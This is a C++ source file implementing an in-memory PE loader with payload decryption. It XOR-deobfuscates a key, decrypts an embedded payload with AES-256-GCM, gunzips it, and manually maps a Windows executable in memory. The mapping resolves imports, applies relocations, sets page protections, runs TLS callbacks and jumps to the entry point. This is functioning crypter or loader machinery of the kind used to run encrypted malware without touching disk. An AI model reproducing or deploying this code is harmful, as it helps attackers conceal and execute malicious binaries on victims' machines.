#include "stuff.h"




std::string stuff::DecryptAESKey(const BYTE* encryptedPayload, size_t keySize_inBytes) {
        if (keySize_inBytes > 0) {
            BYTE* decryptedKey = (BYTE*)malloc(keySize_inBytes - 1);
            BYTE magicbyte = encryptedPayload[0] ^ encryptedPayload[1];
            for (size_t i = 0; i < keySize_inBytes - 1; ++i) {
                decryptedKey[i] = encryptedPayload[i + 1] ^ (BYTE)(magicbyte + i);
            }
            return std::string(reinterpret_cast<char*>(decryptedKey), keySize_inBytes - 1);
        } else {return "";}
    }


BOOL stuff::GZIPdecompress(const BYTE* inCompressedPayload, size_t inLen, BYTE* outDecompressedPayload, size_t *InOutDecompressedSize) {
        z_stream zs;
        memset(&zs, 0, sizeof(zs));
        if (inflateInit2(&zs, 15 + 32) != Z_OK) {printf("inflateInit2 failed while decompressing payload!\n"); return FALSE;}

        size_t totalWritten = 0;
        zs.next_in = (Bytef*)inCompressedPayload;
        zs.avail_in = (uInt)inLen;

        int ret;
        BYTE outerbuf[32768];

        do {
            zs.next_out = outerbuf;
            zs.avail_out = sizeof(outerbuf);

            ret = inflate(&zs, Z_NO_FLUSH);
            size_t produced = sizeof(outerbuf) - zs.avail_out;
            if (produced + totalWritten > *InOutDecompressedSize) {printf("Decompression failed!\n"); inflateEnd(&zs); return FALSE;}
            memcpy(outDecompressedPayload + totalWritten, outerbuf, produced);
            totalWritten += produced;

        } while (ret != Z_STREAM_END);

        if (ret != Z_OK && ret != Z_STREAM_END) {printf("Return value unexpected, decompression failed!\n"); inflateEnd(&zs); return FALSE;}

        *InOutDecompressedSize = zs.total_out;
        inflateEnd(&zs);
	    printf("Decompression succeeded!\n");
	    return TRUE;
    }


static void stuff::print_openssl_error(const std::string &msg) {
    std::cerr << msg << "\n";
    ERR_print_errors_fp(stderr);
}
static BOOL stuff::deriveKey(const std::string &password, const BYTE* salt, BYTE* outKey) {
    if (!PKCS5_PBKDF2_HMAC(
        password.c_str(),
        static_cast<int>(password.size()),
        salt, 
        SALT_LEN,
        PBKDF2_ITER,
        EVP_sha256(),
        KEY_LEN,
        outKey
    )) {print_openssl_error("deriveKey failed!\n"); return FALSE;}
    return TRUE;
}

BOOL stuff::decryptPayload(const std::string& password, const BYTE* encryptedPayload, size_t encryptedPayloadSize, BYTE* decryptedPayload, size_t* decryptedPayloadSize) {
    size_t totalDecrypted = 0;
    BYTE salt[SALT_LEN];
    BYTE IV[IV_LEN];

    if (encryptedPayloadSize < SALT_LEN + IV_LEN + TAG_LEN) {printf("Payload is too small!\n"); return FALSE;}
    memcpy(salt, encryptedPayload, SALT_LEN);
    memcpy(IV, encryptedPayload + SALT_LEN, IV_LEN); 
    size_t cipherText = encryptedPayloadSize - SALT_LEN - IV_LEN - TAG_LEN;

    BYTE tag[TAG_LEN];
    memcpy(tag, encryptedPayload + SALT_LEN + IV_LEN + cipherText, TAG_LEN);

    BYTE key[KEY_LEN];
    if(!deriveKey(password, salt, key)) {return FALSE;}

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if(!ctx) {print_openssl_error("CTX wasn't initialized!"); return FALSE;}
    
    if(1 == 2) {
        clear:
        EVP_CIPHER_CTX_free(ctx);
        OPENSSL_cleanse(key, KEY_LEN);
        return FALSE; 
    }

    if(!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr)) {print_openssl_error("EVP_DecryptInit_ex cipher initialization failed!"); goto clear;}
    if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LEN, nullptr)) {print_openssl_error("EVP_CIPHER_CTX_ctrl set IV_LEN failed!"); goto clear;}
    if(!EVP_DecryptInit_ex(ctx, nullptr, nullptr, key, IV)) {print_openssl_error("EVP_DecryptInit_ex set key/IV failed!"); goto clear;}

    int outLength;
    if(!EVP_DecryptUpdate(ctx, decryptedPayload, &outLength, encryptedPayload + SALT_LEN + IV_LEN, cipherText)) {print_openssl_error("EVP_DecryptUpdate failed!"); goto clear;}
    totalDecrypted += outLength;

    if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, tag)) {print_openssl_error("EVP_CIPHER_CTX_ctrl set TAG failed!"); goto clear;}
    if(!EVP_DecryptFinal_ex(ctx, decryptedPayload, &outLength)) 
    {
        print_openssl_error("EVP_DecryptFinal_ex failed, decryptedPayload & decryptedPayloadSize NULLED!"); 
        memset(decryptedPayload, 0, totalDecrypted);  
        if (decryptedPayloadSize) {*decryptedPayloadSize = 0;}
        goto clear;
    }
    totalDecrypted += outLength;
    
    *decryptedPayloadSize = totalDecrypted;
    EVP_CIPHER_CTX_free(ctx);
    OPENSSL_cleanse(key, KEY_LEN);
    printf("Decrypted successfully!\n");
    return TRUE; 
}



BOOL stuff::readPE(const BYTE* payload, size_t payloadSize, IMAGE_DOS_HEADER* outMZ, DWORD* sig, IMAGE_FILE_HEADER* outFL, IMAGE_OPT_HEADER* outOPT, IMAGE_SECTION_HEADER** outSEC) {
    IMAGE_DOS_HEADER MZh;
	DWORD SG;
	IMAGE_FILE_HEADER FLh;
	IMAGE_OPT_HEADER OPh;
	IMAGE_SECTION_HEADER *SCh;
    size_t offset = 0;

    if (payloadSize < DOS_HEADER_SIZE) { printf("Binary size is smaller than MZ_Header\n"); return FALSE; }
    memcpy(&MZh, payload + offset, DOS_HEADER_SIZE);
    if (MZh.e_magic != 0x5a4d) { printf("It isn't a PE-file\n");  return FALSE; }
    if (payloadSize < (MZh.e_lfanew + SIGNATURE_SIZE + FILE_HEADER_SIZE + OPT_HEADER_SIZE)) { printf("File is too small or corrupted\n");  return FALSE; }
    offset = MZh.e_lfanew;

    memcpy(&SG, payload + offset, SIGNATURE_SIZE);
    if (SG != 0x4550) { printf("Siganture is broken\n"); return FALSE; }
    offset += SIGNATURE_SIZE;

    memcpy(&FLh, payload + offset, FILE_HEADER_SIZE);
    offset += FILE_HEADER_SIZE;
    printf("Section count: %d", FLh.NumberOfSections); printf("\nOptional Header Size: %d \n", (int)FLh.SizeOfOptionalHeader);
    if (FLh.SizeOfOptionalHeader != OPT_HEADER_SIZE) { printf("Optional Header size is wrong\n");  return FALSE; }

    memcpy(&OPh, payload + offset, OPT_HEADER_SIZE); 
    offset += OPT_HEADER_SIZE;
    printf("Import table address = %X\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	printf("Import table size = %d\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);
	printf("Import address table address = %X\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress);
	printf("Import address table address size = %d\n", OPh.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size);

    if (payloadSize < (offset + SECTION_HEADER_SIZE * (FLh.NumberOfSections))) { printf("File is too small (Sections)\n");  return FALSE; }
    SCh = (IMAGE_SECTION_HEADER*)malloc(SECTION_HEADER_SIZE * (FLh.NumberOfSections));
    memcpy(SCh, payload + offset, (SECTION_HEADER_SIZE * (FLh.NumberOfSections)));

    *outMZ = MZh;
	*outFL = FLh;
	*sig = SG;
	*outOPT = OPh;
 	*outSEC = SCh;

	return TRUE;
}

BOOL stuff::loadPE(const BYTE* payload, IMAGE_DOS_HEADER* in_MZHeader, DWORD* in_Signature, IMAGE_FILE_HEADER* in_FILEHeader, IMAGE_OPT_HEADER* in_OPTHeader, IMAGE_SECTION_HEADER* in_SCHeader, LPVOID ImageBase) 
{

	unsigned long sizeofheaders = in_OPTHeader->SizeOfHeaders;
	int i;
    size_t offset = 0;

	for (i = 0; i < in_FILEHeader->NumberOfSections; ++i) {
		if (in_SCHeader[i].PointerToRawData < sizeofheaders) {
			sizeofheaders = in_SCHeader[i].PointerToRawData;
		}
	}

	
	printf("Header Size = %d\n", sizeofheaders);
    memcpy(ImageBase, payload + offset, sizeofheaders);


	for (i = 0; i < in_FILEHeader->NumberOfSections; ++i) {
		BYTE* dest = (BYTE*)ImageBase + in_SCHeader[i].VirtualAddress;
		if (in_SCHeader[i].SizeOfRawData > 0) {
			unsigned long toRead = in_SCHeader[i].SizeOfRawData;
            offset = in_SCHeader[i].PointerToRawData;
			memcpy(dest, payload + offset, toRead);
			if (in_SCHeader[i].Misc.VirtualSize > in_SCHeader[i].SizeOfRawData) {
				memset(dest + in_SCHeader[i].SizeOfRawData, 0, in_SCHeader[i].Misc.VirtualSize - in_SCHeader[i].SizeOfRawData);
			}
		}
		else {
			if (in_SCHeader[i].Misc.VirtualSize) 
			{
				memset(dest, 0, in_SCHeader[i].Misc.VirtualSize);
			}
		}
	} 

	return TRUE;
}

BOOL stuff::doImports(IMAGE_OPT_HEADER* inOPT, LPVOID ImageBase) {
	IMAGE_DATA_DIRECTORY ImportDIR = inOPT->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (ImportDIR.Size == 0) { return TRUE; }

	IMAGE_IMPORT_DESCRIPTOR* importdesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)ImageBase + ImportDIR.VirtualAddress);
	for (; importdesc->Name != 0; ++importdesc) {
		CHAR* dllname = (CHAR*)((BYTE*)ImageBase + importdesc->Name);
		HMODULE hMod = NULL;

		hMod = GetModuleHandleA(dllname);
		if (!hMod) { hMod = LoadLibraryA(dllname); }
		if (!hMod) { printf("Library %s wasn't loaded\n", dllname); return FALSE; }
		IMAGE_THUNK_DATA* ilt = (IMAGE_THUNK_DATA*)((BYTE*)ImageBase + importdesc->OriginalFirstThunk);
		IMAGE_THUNK_DATA* iat = (IMAGE_THUNK_DATA*)((BYTE*)ImageBase + importdesc->FirstThunk);

		if (importdesc->OriginalFirstThunk == 0) { ilt = iat; };

		for (; ilt->u1.AddressOfData != 0; ilt++, iat++) {
			FARPROC fn;
			if (ilt->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				WORD ord = (WORD)(ilt->u1.Ordinal & 0xFFFF);
				fn = GetProcAddress(hMod, (LPCSTR)ord);
				if (fn == NULL) { printf("GetProcAdress() for ordinal %d failed\n", ord); return FALSE; }
				iat->u1.Function = (ULONGLONG)fn;
			} else 
			{
				IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)((BYTE*)ImageBase + ilt->u1.AddressOfData);
				CHAR* funcName = (CHAR*)ibn->Name;
				fn = GetProcAddress(hMod, funcName);
				if (fn == NULL) { printf("GetProcAdress(%s) failed\n", funcName); return FALSE; }
				iat->u1.Function = (ULONGLONG)fn;
			}
		}
	}
	return TRUE;
}
BOOL stuff::doRelocs(IMAGE_OPT_HEADER *inOpt, LPVOID ImageBase) {

	if (inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) return TRUE;
	BYTE *relocStart = (BYTE*)ImageBase + inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	BYTE *relocEnd = relocStart + inOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;  
	ULONGLONG delta = (ULONGLONG)((BYTE*)ImageBase - inOpt->ImageBase);
	if (delta == 0) { 
	printf("ImageBase is correct\n");
	return TRUE;}

	while (relocStart < relocEnd) {
		IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)relocStart;
		DWORD base = block->VirtualAddress;
		DWORD size = block->SizeOfBlock;
		if (size == 0) {break;} 
		if (size < sizeof(IMAGE_BASE_RELOCATION)) {printf("Inval SizeOfBlock\n"); return FALSE;}
		WORD *entries = (WORD*)(block + 1);

		DWORD count = ((size - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD));
		for (DWORD i = 0; i < count; ++i) {
			WORD type = entries[i] >> 12;
			WORD offset = entries[i] & 0x0FFF;

			BYTE* addresstopatch = (BYTE*)ImageBase + base + offset;

			if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
			else if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)addresstopatch += delta;
			else if (type == IMAGE_REL_BASED_DIR64) *(ULONGLONG*)addresstopatch += delta;
			else { printf("doRelocs failed, type is unknown\n"); return FALSE;}
		}
		relocStart = (BYTE*)block + block->SizeOfBlock;
	}
	return TRUE;
}

DWORD stuff::characteristicsToProtect(DWORD ch) {
    bool r = ch & IMAGE_SCN_MEM_READ;
    bool w = ch & IMAGE_SCN_MEM_WRITE;
    bool x = ch & IMAGE_SCN_MEM_EXECUTE;

    if (x) {
        if (w) return PAGE_EXECUTE_READWRITE;
        if (r) return PAGE_EXECUTE_READ;
        return PAGE_EXECUTE;
    } else {
        if (w) return PAGE_READWRITE;
        if (r) return PAGE_READONLY;
        return PAGE_NOACCESS;
    }
}

BOOL stuff::changeProtection(IMAGE_SECTION_HEADER* sec, LPVOID ImageBase) {
	DWORD oldprotect;
	LPVOID secBase = (BYTE*)ImageBase + sec->VirtualAddress;
	SIZE_T size = sec->Misc.VirtualSize;

	if (size == 0) return TRUE;
	DWORD prot = characteristicsToProtect(sec->Characteristics);

	return VirtualProtect(secBase, size, prot, &oldprotect);
}
BOOL stuff::callTLScallbacks(IMAGE_OPT_HEADER *inOh, LPVOID ImageBase, DWORD dwReason) {
	 if (inOh->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size == 0) {printf("TLS callbacks are empty!\n"); return TRUE;}
	 TLS_DIRECTORY* tlsDir = (TLS_DIRECTORY*)((BYTE*)ImageBase + inOh->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

	 if (tlsDir->AddressOfCallBacks == 0) {printf("AddressOfCallback is 0!\n"); return TRUE;}
	 PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK*)((BYTE*)ImageBase + (tlsDir->AddressOfCallBacks - inOh->ImageBase));
	 if (callbacks == NULL) {printf("There aren't any callbacks!\n"); return TRUE;}
	 for (SIZE_T i = 0; callbacks[i]; i++) {
		callbacks[i](ImageBase, dwReason, NULL);
		printf("Callback №%d called", i);
	}
	return TRUE;
}
BOOL stuff::callEXE_EntryPoint(IMAGE_OPT_HEADER *inOh, LPVOID ImageBase) {
	EntryFn entry = (EntryFn)((BYTE*)ImageBase + inOh->AddressOfEntryPoint);
	printf("Calling EXE entry at %p...\n", entry);
	try {
		entry();
		printf("Entry point called successfullly!\n");
		return TRUE;
	} catch(...) {
		printf("Exception while entry point call!\n");
		return FALSE;
	}
}

BOOL stuff::LoadPEMain(const BYTE* payload, size_t payloadSize) {
    IMAGE_DOS_HEADER MZ_Header;
	DWORD Signature;
	IMAGE_FILE_HEADER FL_Header;
	IMAGE_OPT_HEADER OPT_Header;
	IMAGE_SECTION_HEADER *SC_Header = NULL;
    LPVOID ImageBase = NULL;

    if (readPE(payload, payloadSize, &MZ_Header, &Signature, &FL_Header, &OPT_Header, &SC_Header)) {
        SIZE_T imageSize = OPT_Header.SizeOfImage;
        ImageBase = VirtualAlloc(NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (ImageBase) {
			printf("Image Base address = %p\n", ImageBase);
            if (loadPE(payload, &MZ_Header, &Signature, &FL_Header, &OPT_Header, SC_Header, ImageBase)) {
                printf("ImageBase load successful!\n");
                if(doImports(&OPT_Header, ImageBase)) {
                    printf("DoImports succeded!\n");
                    if(doRelocs(&OPT_Header, ImageBase)) {
                        printf("Relocation patch is successful!\n");
                        for (SIZE_T i = 0; i < FL_Header.NumberOfSections; i++) {
                            if (!changeProtection(&SC_Header[i], ImageBase)) {printf("changeProtection for SC_Header[%d] failed!\n", i); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                        } 
                        if (callTLScallbacks(&OPT_Header, ImageBase, DLL_PROCESS_ATTACH)) {
                            if(callEXE_EntryPoint(&OPT_Header, ImageBase)) {
                                printf("SUCCESS!\n");
                                 return TRUE;
                            } else {printf("EXE call failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                        } else {printf("TLS patch failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                    }else {printf("DoRelocs failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
                } else {printf("DoImports failed!\n"); VirtualFree(ImageBase, 0, MEM_RELEASE); return FALSE;}
            }
        } 
    } 
    return FALSE;
}